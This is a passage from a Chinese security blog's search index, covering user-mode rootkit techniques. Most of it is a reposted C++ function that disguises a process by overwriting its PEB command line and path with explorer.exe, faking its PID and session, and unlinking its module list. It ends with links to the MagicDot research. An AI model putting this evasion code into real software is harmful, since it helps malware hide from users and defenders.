class="hljs-keyword">push</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">push</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">push</span> <span class="hljs-number">0C0000005h</span><br><span class="hljs-keyword">call</span> <span class="hljs-built_in">ebx</span><br><br>    fn ExitProcess,<span class="hljs-number">0</span><br><br>end     start<br></code></pre></td></tr></table></figure><h1 id="进程混淆"><a href="#进程混淆" class="headerlink" title="进程混淆"></a>进程混淆</h1><p>转载自 <a href="https://www.52pojie.cn/thread-1870481-1-1.html">3环进程混淆思路</a></p><p>混淆前</p><p><img src="/articles/ring3_rootkit/5.png"></p><p>混淆后</p><p><img src="/articles/ring3_rootkit/6.png"></p><p>好像就修改了命令行，用处不大</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function">BOOL <span class="hljs-title">SelfOBF</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-meta">#<span class="hljs-keyword">define</span>  FAKE_CMDLINE  <span class="hljs-string">L&quot;C:\\Windows\\explorer.exe&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span>  FAKE_PATH <span class="hljs-string">L&quot;C:\\Windows\\explorer.exe&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">NTSTATUS</span></span><br><span class="hljs-function"><span class="hljs-params">(__stdcall* MyNtQueryInformationProcess)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">IN HANDLE ProcessHandle,</span></span><br><span class="hljs-params"><span class="hljs-function">IN PROCESSINFOCLASS ProcessInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">OUT PVOID ProcessInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">IN ULONG ProcessInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">OUT PULONG ReturnLength OPTIONAL</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br><br>PPEB pebProcess = &#123; <span class="hljs-number">0</span> &#125;;<br>PROCESS_BASIC_INFORMATION pbiProcess = &#123; <span class="hljs-number">0</span> &#125;;<br>HANDLE hProcess = <span class="hljs-number">0</span>;<br>ULONG Infolen = <span class="hljs-number">1024</span>;<br>ULONG Retlen = <span class="hljs-number">0</span>;<br>NTSTATUS status = <span class="hljs-number">0</span>;<br>HMODULE hNtdll = <span class="hljs-number">0</span>;<br>UNICODE_STRING unCmdline;<br>UINT64 fakepid = <span class="hljs-number">4</span>;<br>ULONG fakesession = <span class="hljs-number">0</span>;<br>MyNtQueryInformationProcess ntQueryProcess = <span class="hljs-literal">NULL</span>;<br><br>hNtdll = <span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br><br><span class="hljs-keyword">if</span> (hNtdll &lt;= (HMODULE)<span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>ntQueryProcess = (MyNtQueryInformationProcess)<span class="hljs-built_in">GetProcAddress</span>(hNtdll, <span class="hljs-string">&quot;NtQueryInformationProcess&quot;</span>);<br><br><span class="hljs-keyword">if</span> (ntQueryProcess &lt;= (MyNtQueryInformationProcess)<span class="hljs-number">0</span>)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, <span class="hljs-built_in">GetCurrentProcessId</span>());<br><br><span class="hljs-keyword">if</span> (!hProcess)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>status = <span class="hljs-built_in">ntQueryProcess</span>(hProcess, ProcessBasicInformation, &amp;pbiProcess, <span class="hljs-built_in">sizeof</span>(PROCESS_BASIC_INFORMATION), &amp;Retlen);<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-built_in">NT_SUCCESS</span>(status))<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (pbiProcess.PebBaseAddress == <span class="hljs-literal">NULL</span>)<br>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br>pebProcess = pbiProcess.PebBaseAddress;<br><br><span class="hljs-comment">//修改cmdline</span><br><span class="hljs-built_in">RtlZeroMemory</span>((pebProcess-&gt;ProcessParameters-&gt;CommandLine).Buffer, <span class="hljs-built_in">wcslen</span>((pebProcess-&gt;ProcessParameters-&gt;CommandLine).Buffer) * <span class="hljs-number">2</span>);<br><br><span class="hljs-built_in">RtlCopyMemory</span>((pebProcess-&gt;ProcessParameters-&gt;CommandLine).Buffer, FAKE_CMDLINE, <span class="hljs-built_in">wcslen</span>(FAKE_CMDLINE) * <span class="hljs-number">2</span>);<br><br><span class="hljs-comment">//修改路径</span><br><span class="hljs-built_in">RtlZeroMemory</span>((pebProcess-&gt;ProcessParameters-&gt;ImagePathName).Buffer, <span class="hljs-built_in">wcslen</span>((pebProcess-&gt;ProcessParameters-&gt;ImagePathName).Buffer) * <span class="hljs-number">2</span>);<br><br><span class="hljs-built_in">RtlCopyMemory</span>((pebProcess-&gt;ProcessParameters-&gt;ImagePathName).Buffer, FAKE_PATH, <span class="hljs-built_in">wcslen</span>(FAKE_PATH) * <span class="hljs-number">2</span>);<br><br><span class="hljs-comment">//修改进程id</span><br><span class="hljs-built_in">RtlCopyMemory</span>(&amp;(pbiProcess.UniqueProcessId), &amp;fakepid, <span class="hljs-built_in">sizeof</span>(UINT64));<br><br><span class="hljs-comment">//修改会话层</span><br><span class="hljs-built_in">RtlCopyMemory</span>(&amp;(pebProcess-&gt;SessionId), &amp;fakesession, <span class="hljs-built_in">sizeof</span>(ULONG));<br><br><span class="hljs-comment">//断链</span><br>(pebProcess-&gt;Ldr-&gt;InMemoryOrderModuleList.Blink)-&gt;Flink = pebProcess-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink;<br>(pebProcess-&gt;Ldr-&gt;InMemoryOrderModuleList.Flink)-&gt;Blink = pebProcess-&gt;Ldr-&gt;InMemoryOrderModuleList.Blink;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="MagicDot"><a href="#MagicDot" class="headerlink" title="MagicDot"></a>MagicDot</h1><p>懒得写了，直接贴原帖吧</p><p><a href="https://github.com/SafeBreach-Labs/MagicDot">https://github.com/SafeBreach-Labs/MagicDot</a></p><p><a href="https://i.blackhat.com/Asia-24/Presentations/Asia-24-Yair-magicdot-a-hackers-magic-show-of-disappearing-dots-and-spaces.pdf">https://i.blackhat.com/Asia-24/Presentations/Asia-24-Yair-magicdot-a-hackers-magic-show-of-disappearing-dots-and-spaces.pdf</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>编程</tag>
      
      <tag>网络安全</tag>
      
      <tag>Windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
